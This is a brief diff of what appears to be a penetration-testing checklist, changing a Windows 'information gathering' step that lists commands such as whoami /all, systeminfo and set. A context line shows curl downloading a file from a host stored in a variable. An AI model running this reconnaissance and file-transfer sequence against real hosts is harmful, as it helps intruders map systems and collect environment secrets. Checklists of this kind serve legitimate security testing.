@@ -120,7 +120,7 @@ curl $h/file -so file
 <details><summary><input type=checkbox> information gathering</summary>
 
 ```sh
-dir
+dir /q
 whoami /all
 systeminfo
 set
